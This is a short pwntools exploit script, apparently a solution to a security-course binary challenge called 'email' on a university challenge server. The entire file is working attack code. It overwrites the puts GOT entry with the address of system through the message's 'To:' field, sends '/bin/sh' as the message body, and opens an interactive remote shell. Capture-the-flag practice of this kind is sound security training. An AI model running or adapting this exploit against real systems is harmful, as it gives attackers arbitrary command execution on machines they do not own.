from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./email"

LOCAL = False

if LOCAL:
    p = process(target_file)
    # p = gdb.debug(target_file, '''
    # b main
    # continue
    # ''')
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1295)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")

target_elf = ELF(target_file, checksec=False)

puts_got_address = 0x404020
system_plt_address = target_elf.symbols.system
print(f"puts GOT address: {hex(puts_got_address)}")
print(f"system PLT address: {hex(system_plt_address)}")

p.recvuntil(b'To: ')
p.send(p64(system_plt_address) + p64(puts_got_address))
p.recvuntil(b'Subject: ')
p.send(b"SSSSSSSS")
p.recvuntil(b'Message: ')
bin_sh_packet = b'/bin/sh\x00'
p.send(bin_sh_packet)

p.recvuntil(b'sending ...\n')

p.interactive()
